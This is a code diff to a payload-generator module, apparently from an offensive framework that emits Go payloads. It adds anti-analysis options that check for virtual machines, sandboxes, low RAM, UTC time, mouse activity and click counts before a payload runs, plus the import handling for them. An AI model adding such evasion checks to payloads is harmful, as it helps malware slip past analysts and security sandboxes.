@@ -41,6 +41,15 @@ class PayloadModule:
             "HOSTNAME"       : ["X", "Optional: Required system hostname"],
             "PROCESSORS"     : ["X", "Optional: Minimum number of processors"],
             "USERNAME"       : ["X", "Optional: The required user account"],
+            "UTCCHECK"       : ["FALSE", "Check if system uses UTC time"],
+            "USERPROMPT"     : ["FALSE", "Prompt user prior to injection"],
+            "RAMCHECK"       : ["FALSE", "Check for at least 3 gigs of RAM"],
+            "PROCCHECK"      : ["FALSE", "Check for active VM processes"],
+            "MINPROCS"       : ["X", "Minimum number of running processes"],
+            "BADMACS"        : ["FALSE", "Check for VM based MAC addresses"],
+            "CLICKTRACK"     : ["X", "Require X number of clicks before execution"],
+            "CURSORCHECK"    : ["FALSE", "Check for mouse movements"],
+            "DISKSIZE"       : ["X", "Check for a minimum number of gigs for hard disk"],
             "SLEEP"          : ["X", "Optional: Sleep \"Y\" seconds, check if accelerated"]
         }
 
@@ -87,14 +96,23 @@ class PayloadModule:
 
         # Add in other imports based on checks being performed
         if self.required_options["USERNAME"][0].lower() != "x":
-            payload_code += "\"strings\"\n\"os\"\n\"os/user\"\n"
-        if self.required_options["HOSTNAME"][0].lower() != "x":
+            payload_code += "\"strings\"\n\"os/user\"\n"
+        if self.required_options["HOSTNAME"][0].lower() != "x" or self.required_options["PROCCHECK"][0].lower() != 'false':
             if "strings" not in payload_code:
                 payload_code += "\"strings\"\n"
-            if "os" not in payload_code:
-                payload_code += "\"os\"\n"
         if self.required_options["SLEEP"][0].lower() != "x":
             payload_code += "\"net\"\n\"time\"\n\"encoding/binary\"\n"
+        if self.required_options["BADMACS"][0].lower() != 'false':
+            if "net" not in payload_code:
+                payload_code += "\"net\"\n"
+            if "strings" not in payload_code:
+                payload_code += "\"strings\"\n"
+        if self.required_options["UTCCHECK"][0].lower() != 'false':
+            if "time" not in payload_code:
+                payload_code += "\"time\"\n"
+        if self.required_options["CURSORCHECK"][0].lower() != 'false':
+            if "time" not in payload_code:
+                payload_code += "\"time\"\n"
 
         payload_code += ")\n"
 
